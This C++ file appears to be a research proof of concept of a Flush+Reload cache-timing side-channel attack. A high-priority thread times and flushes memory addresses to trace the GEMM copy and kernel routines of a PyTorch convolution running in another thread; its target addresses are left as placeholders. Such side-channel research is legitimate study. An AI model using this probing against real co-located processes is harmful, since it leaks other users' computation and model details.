#include <torch/torch.h>
#include <semaphore.h>
#include <pthread.h>
#include <sched.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <dlfcn.h>
#include <stdint.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <ctype.h>

#define MAX_BUF 100000
#ifndef MIN
#define MIN(a,b) (((a)<(b))?(a):(b))
#endif /* MIN */
#ifndef MAX
#define MAX(a,b) (((a)>(b))?(a):(b))
#endif/* MAX */
#define TMAX 1000
#define ITER 1
sem_t attack_sem;
sem_t victim_sem;
sem_t end_sem;

bool trace_queue[MAX_BUF];

int target_num = 0;
void * target[TMAX];


using namespace torch;

void insert_target(void * addr){
  target[target_num++] = addr;
}
bool ThreadSetPriority( pthread_t hThread, int priority )
{

  struct sched_param thread_param;
  thread_param.sched_priority = priority;



  return   pthread_setschedparam( hThread, SCHED_FIFO, &thread_param );
}
struct Net : torch::nn::Module {
  Net() {

    // Construct and register conv layer.
    //conv1 = register_module("conv1", nn::Conv2d(nn::Conv2dOptions(3, 64, 7).stride(2).padding(3))); //224
    //conv1 = register_module("conv1", nn::Conv2d(nn::Conv2dOptions(3, 64, 3).stride(2).padding(1))); //128
    //conv1 = register_module("conv1", nn::Conv2d(nn::Conv2dOptions(3, 64, 4).stride(1).padding(1))); //64
    conv1 = register_module("conv1", nn::Conv2d(nn::Conv2dOptions(3, 64, 3).stride(1).padding(1))); //32

  }

  torch::Tensor forward(torch::Tensor x) {

    x = conv1->forward(x);

    return x;
  }

  // Use one of many "standard library" modules.
  nn::Conv2d conv1{nullptr};
};
void *map_offset(const char *file, size_t offset) {
  int fd = open(file, O_RDONLY);
  if (fd < 0)
    return NULL;

  char *mapaddress = static_cast<char*>(mmap(0, sysconf(_SC_PAGE_SIZE), PROT_READ, MAP_PRIVATE, fd, offset & ~(sysconf(_SC_PAGE_SIZE) -1)));
  close(fd);
  if (mapaddress == MAP_FAILED)
    return NULL;
  return (void *)(mapaddress+(offset & (sysconf(_SC_PAGE_SIZE) -1)));
}
void unmap_offset(void *address) {
  munmap((char *)(((uintptr_t)address) & ~(sysconf(_SC_PAGE_SIZE) -1)), sysconf(_SC_PAGE_SIZE));
}
__attribute__((always_inline))
inline unsigned long probe(const void *adrs) {
  volatile unsigned long time;

  asm __volatile__ (
                        "  mfence             \n"
                            "  lfence             \n"
                            "  rdtsc              \n"
                            "  lfence             \n"
                            "  movl %%eax, %%esi  \n"
                            "  movl (%1), %%eax   \n"
                            "  lfence             \n"
                            "  rdtsc              \n"
                            "  subl %%esi, %%eax  \n"
                            "  clflush 0(%1)      \n"
                        : "=a" (time)
                        : "c" (adrs)
                        :  "%esi", "%edx");
  return time;
}



void * attackThread(void *arg){
  int service_count = 0;
  int service_max = ITER;
  unsigned long long prev;
  int temp_load;
  unsigned long  temp;
  unsigned long*  min_temp = (unsigned long*)malloc(sizeof(unsigned long)*service_max);
  unsigned long*  max_temp =(unsigned long*)malloc(sizeof(unsigned long)*service_max);
  int** log = (int**)malloc(sizeof(int*)*service_max);
  int** time_log = (int**)malloc(sizeof(int*)*service_max);
  int** delay_log = (int**)malloc(sizeof(int*)*service_max);
  int* idx =  (int*)malloc(sizeof(int)*service_max);
  
  register int time = 0;

  
  while(service_count < service_max){
    time = 0;
    log[service_count] = (int*)malloc(sizeof(int)*10000);
    time_log[service_count] = (int*)malloc(sizeof(int)*10000);
    delay_log[service_count] = (int*)malloc(sizeof(int)*10000);
    idx[service_count] = 0;
    
    printf("[2] Round %d\n",service_count);
    sem_wait(&victim_sem);
    min_temp[service_count] = 1000000;
    max_temp[service_count] = 0;
    printf("[2] start monitoring...\n");
    
    unsigned long long total =0;

    log[service_count][idx[service_count]] = -1;
    delay_log[service_count][idx[service_count]] = temp;
    time_log[service_count][idx[service_count]++] = time;
    while(sem_trywait(&attack_sem) < 0){
#pragma GCC unroll 50
      for(register int i = 0 ; i < 10000; i++){

        time++;
        for(register int j = 0 ; j < target_num; j++){
          temp = probe(target[j]);

          if(temp < 100){
              log[service_count][idx[service_count]] = j;
              delay_log[service_count][idx[service_count]] = temp;
              time_log[service_count][idx[service_count]++] = time++;
          }
        }

      }

    }
    printf("[2] attacker ends...\n");
    sem_post(&end_sem);
    service_count++;
  }
  
    for(int i = 0; i < service_max;i++){
      printf("[2] %d round trace\n",i);
      for(int j = 0 ; j < idx[i];j++){
        if(log[i][j] == 1)
          printf("oncopy %d %d \n",time_log[i][j],delay_log[i][j]);


        if(log[i][j] == 0)
          printf("itcopy %d %d \n",time_log[i][j],delay_log[i][j]);


        if(log[i][j] == 2)
          printf("kernel %d %d \n",time_log[i][j],delay_log[i][j]);
      }
    }

}
void * victimThread(void *arg) {
  int service_count = 0;
  int temp;
  while (service_count < ITER) {
    printf("[1] Round %d\n",service_count);
    torch::jit::script::Module module;
    auto net = std::make_shared<Net>();


    //input data
    //at::Tensor inputTensor = torch::ones({1, 3,224,224});
    //at::Tensor inputTensor = torch::ones({1, 3,128,128});
    //at::Tensor inputTensor = torch::ones({1, 3,64,64});
    at::Tensor inputTensor = torch::ones({1, 3,32,32});



    // Create a vector of inputs.

    sem_post(&victim_sem);
    
    usleep(10);
    printf("[1] start victim inference\n");
    torch::Tensor prediction1 = net->forward(inputTensor);
    printf("[1] victim ends\n");
    usleep(10);
 
    sem_post(&attack_sem);
    sem_wait(&end_sem);
    service_count++;
  }
  return NULL;
}
int main() {
  pthread_t vic, atk;
  void * fdl;
  int rc;
  pthread_attr_t attr;
  struct sched_param param;


  // insert target address 
  //insert_target((void*)0x7fffxxxxxxxx); //itcopy 0
  //insert_target((void*)0x7fffxxxxxxxx); //oncopy 1
  //insert_target((void*)0x7fffxxxxxxxx); //kernel 2

  
  sem_init(&attack_sem,0,1);
  sem_init(&victim_sem,0,1);
  sem_init(&end_sem,0,1);

  sem_trywait(&end_sem);
  sem_trywait(&attack_sem);
  sem_trywait(&victim_sem);

  pthread_create(&atk, NULL, attackThread,NULL);
  pthread_create(&vic, NULL, victimThread,NULL);

  printf("set threads property\n");
  printf("%d\n",ThreadSetPriority(atk, -20));
  printf("done\n");

  pthread_join(vic,NULL);
  pthread_join(atk,NULL);
  
  sem_destroy(&attack_sem);
  sem_destroy(&victim_sem);
  
  printf("%p %p %p\n",target[0],target[1],target[2]);
  
}
